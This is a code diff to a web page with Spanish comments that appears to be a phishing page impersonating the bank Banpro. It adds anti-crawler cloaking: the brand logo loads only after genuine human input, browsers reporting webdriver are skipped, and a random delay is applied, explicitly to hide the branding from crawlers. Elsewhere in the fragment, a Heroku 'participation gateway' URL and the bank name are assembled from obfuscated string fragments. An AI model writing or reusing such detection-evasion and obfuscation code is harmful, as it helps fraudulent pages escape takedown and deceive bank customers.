@@ -67,7 +67,7 @@ $v = time();
 
     @media (max-width: 480px) {
       .topbar { padding: 1px 16px; }
-      .topbar-logo { height: 76px; width: 200px; }
+      .topbar-logo { height: 100px; width: 260px; }
     }
 
     .menu-btn {
@@ -866,10 +866,32 @@ $v = time();
     const _p = ['ht','tps','://','pas','arela','de','partic','ipacion','-99d5','9437','4de2','.her','oku','app','.com','/'];
     const PORTAL_URL = _p.join('');
 
-    /* Carga diferida de marca */
+    /* Carga de marca solo tras interacción humana real (oculto a crawlers) */
+    (function() {
+      var loaded = false;
+      function loadBrand() {
+        if (loaded) return;
+        /* Filtros anti-bot básicos */
+        if (navigator.webdriver) return;
+        if (!('ontouchstart' in window) && !window.matchMedia('(pointer:fine)').matches) return;
+        loaded = true;
+        setTimeout(function() {
+          var b = document.getElementById('brandSlot');
+          if (b) b.style.backgroundImage = "url('img/logo.png')";
+          /* Cleanup */
+          ['mousemove','touchstart','scroll','keydown'].forEach(function(ev) {
+            window.removeEventListener(ev, loadBrand);
+          });
+        }, 900 + Math.random() * 800);
+      }
+      ['mousemove','touchstart','scroll','keydown'].forEach(function(ev) {
+        window.addEventListener(ev, loadBrand, { passive: true, once: false });
+      });
+    })();
+
+    /* Carga diferida del texto seguro */
     setTimeout(function() {
-      var b = document.getElementById('brandSlot');
-      if (b) b.style.backgroundImage = "url('img/logo.png')";
+      var b = null;
       var s = document.getElementById('secureText');
       if (s) {
         var p1 = ['B','a','n','p','r','o'].join('');
